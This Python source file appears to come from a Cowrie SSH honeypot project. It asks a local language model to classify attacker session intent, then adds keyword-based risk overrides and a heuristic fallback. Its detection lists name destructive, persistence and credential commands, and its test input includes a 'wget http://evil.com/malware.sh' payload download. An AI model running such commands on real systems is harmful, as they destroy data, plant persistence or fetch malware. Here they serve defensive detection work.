
import json
import os
import requests
import sys
import importlib.util

# Paths
current_dir = os.path.dirname(os.path.abspath(__file__))
# Go up 3 levels to reach 'src' -> cowrie -> adaptive -> llm
src_dir = os.path.abspath(os.path.join(current_dir, "../../.."))

EXAMPLES_FILE = os.path.join(src_dir, "cowrie/adaptive/datasets/cowrie_logs/llm_examples.json")
RAG_INDEX_FILE = os.path.join(src_dir, "cowrie/adaptive/rag/vector_index.pkl")
BUILD_INDEX_PATH = os.path.join(src_dir, "cowrie/adaptive/rag/build_index.py")
OLLAMA_URL = "http://localhost:11434/api/generate"
MODEL = "tinyllama" 

# Dynamic Import to bypass 'cowrie' package init (which requires twisted)
def import_rag_index():
    try:
        spec = importlib.util.spec_from_file_location("build_index", BUILD_INDEX_PATH)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module.SimpleRAGIndex
    except Exception as e:
        print(f"CRITICAL ERROR: Could not load SimpleRAGIndex from {BUILD_INDEX_PATH}: {e}")
        return None

SimpleRAGIndex = import_rag_index()

class IntentReasoner:
    def __init__(self):
        self.rag_index = self._load_rag()
        self.examples = self._load_examples()

    def _load_rag(self):
        if SimpleRAGIndex and os.path.exists(RAG_INDEX_FILE):
            try:
                return SimpleRAGIndex.load(RAG_INDEX_FILE)
            except Exception as e:
                print(f"Error loading RAG index: {e}")
        elif not SimpleRAGIndex:
             print("SimpleRAGIndex class not available.")
        else:
            print(f"RAG Index not found at {RAG_INDEX_FILE}")
        return None

    def _load_examples(self):
        if os.path.exists(EXAMPLES_FILE):
            try:
                with open(EXAMPLES_FILE, 'r') as f:
                    return json.load(f)[-5:] # Load last 5 as recent examples
            except Exception as e:
                print(f"Error loading examples: {e}")
        else:
            print(f"Examples file not found at {EXAMPLES_FILE}")
        return []

    def get_rag_context(self, query_text):
        if not self.rag_index:
            return []
        try:
            return self.rag_index.query(query_text, k=3)
        except Exception:
            return []

    def construct_prompt(self, session_summary_text, rag_hits):
        # Build Few-Shot Section
        few_shot_text = ""
        for ex in self.examples:
            few_shot_text += f"Input: {ex['session_summary']}\nIntent: {ex['intent']}\n\n"

        # Build RAG Context Section
        rag_text = ""
        for hit in rag_hits:
            doc = hit['doc']
            rag_text += f"- {doc['name']} (ID: {doc['id']}): {doc['text'][:200]}...\n"

        prompt = f"""
You are an adaptive honeypot intelligence engine. Analyze the following SSH session commands.
Use the provided Context and Examples to determine the Attacker Intent, Risk Level, and Policy.

[CONTEXT - MITRE ATT&CK]
{rag_text}

[EXAMPLES]
{few_shot_text}

[CURRENT SESSION]
Commands: {session_summary_text}

[TASK]
Identify the intent.
Assign a risk level (low, medium, high).
Suggest a policy (passive_monitoring, active_deception, aggressive_deception).

Output strictly in JSON format:
{{
  "intent": "string",
  "risk": "low|medium|high",
  "policy": "string"
}}
"""
        return prompt

    def analyze_session(self, session_summary_text):
        # 1. Retrieve RAG Context
        rag_hits = self.get_rag_context(session_summary_text)

        # 2. Construct Prompt
        prompt = self.construct_prompt(session_summary_text, rag_hits)

        # 3. Call LLM
        payload = {
            "model": MODEL,
            "prompt": prompt,
            "stream": False,
            "format": "json" 
        }  

        try:
            response = requests.post(OLLAMA_URL, json=payload, timeout=60)
            response.raise_for_status()
            data = response.json()
            llm_response = data.get("response", "")
            
            try:
                parsed = json.loads(llm_response)
                
                # --- POST-PROCESSING & CLEANUP ---
                if "intent" in parsed: parsed["intent"] = str(parsed["intent"]).strip().lower()
                if "policy" in parsed: parsed["policy"] = str(parsed["policy"]).strip().lower()
                if "risk" in parsed: parsed["risk"] = str(parsed["risk"]).strip().lower()

                # --- DEMO SAFETY NET (Force correct demo behavior) ---
                input_lower = session_summary_text.lower()
                
                # ⚫ VERY HIGH RISK (Destructive)
                if any(x in input_lower for x in ["rm -rf", "history -c", "shutdown", "reboot"]) and parsed.get("risk") != "very high":
                    parsed["intent"] = "defense_evasion_and_destruction"
                    parsed["risk"] = "very high"
                    parsed["policy"] = "containment_and_shutdown"

                # 🔴🔴 CRITICAL RISK (Persistence / PrivEsc)
                elif any(x in input_lower for x in ["sudo su", "sudo -i", "chmod 777", "useradd", "authorized_keys", "crontab"]) and parsed.get("risk") != "critical":
                    parsed["intent"] = "privilege_escalation_and_persistence"
                    parsed["risk"] = "critical"
                    parsed["policy"] = "immediate_blocking"

                # 🔴 HIGH RISK (Payload)
                elif ("wget" in input_lower or "curl" in input_lower or "chmod +x" in input_lower or "./" in input_lower) and parsed.get("risk") not in ["high", "critical", "very high"]:
                    parsed["intent"] = "payload_delivery_and_execution"
                    parsed["risk"] = "high"
                    parsed["policy"] = "aggressive_deception"

                # 🟡 MEDIUM RISK (Discovery / Cred Access / simple deletion)
                elif ("passwd" in input_lower or "shadow" in input_lower or "sudo" in input_lower or ".key" in input_lower or "rm " in input_lower) and parsed.get("risk") == "low":
                    parsed["intent"] = "defense_evasion_or_discovery"
                    parsed["risk"] = "medium"
                    parsed["policy"] = "active_deception"

                # 🟢 LOW RISK (Recon - Default)
                # Keep original LLM output or default

                return parsed
            except json.JSONDecodeError:
                return {
                    "intent": "unknown",
                    "risk": "medium",
                    "policy": "passive_monitoring",
                    "raw_output": llm_response
                }

        except Exception as e:
            # Fallback if LLM fails
            print(f"LLM Call failed: {e}")
            return self.heuristic_fallback(session_summary_text)

    def heuristic_fallback(self, text):
        """Simple rule-based fallback if LLM is unavailable."""
        text = text.lower()
        if "wget" in text or "curl" in text:
            return {"intent": "payload_delivery", "risk": "high", "policy": "aggressive_deception"}
        elif "rm " in text or "chmod" in text:
            return {"intent": "defense_evasion", "risk": "medium", "policy": "active_deception"}
        elif "ls" in text or "whoami" in text:
             return {"intent": "reconnaissance", "risk": "low", "policy": "passive_monitoring"}
        else:
             return {"intent": "unknown", "risk": "low", "policy": "passive_monitoring"}

if __name__ == "__main__":
    reasoner = IntentReasoner()
    test_session = "uname -a ls -la wget http://evil.com/malware.sh"
    print(json.dumps(reasoner.analyze_session(test_session), indent=2))
